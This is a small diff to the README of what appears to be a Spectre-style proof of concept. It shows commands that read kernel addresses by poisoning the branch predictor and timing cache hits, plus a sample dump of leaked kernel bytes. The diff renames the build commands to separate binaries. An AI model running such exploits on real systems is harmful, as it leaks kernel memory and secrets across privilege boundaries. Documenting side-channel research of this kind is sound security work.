@@ -18,15 +18,12 @@ $ ./poc ffffffffa2c09870  # skip some because it's mostly zeros
 
 Read kernel addresses by poisoning the branch predictor and speculatively hitting a cacheline:
 ```
-make CLFAGS=-DPOISON
-$ ./poc 0xffffffffa2c09880
+$ ./poc_poison 0xffffffffa2c09880
 0xffffffffa2c09880 | 67 20 21 b3 03 00 00 00 00 00 00 00 00 00 00 00 
 ...
 ```
 
 Visualize memory read timings:
 ```
-$ make CFLAGS=-DVISUALIZE
-cc -o poc poc.c -DVISUALIZE -lm 
-$ ./poc 0xffffffffa2c09883
+$ ./poc_vis 0xffffffffa2c09883
 ```
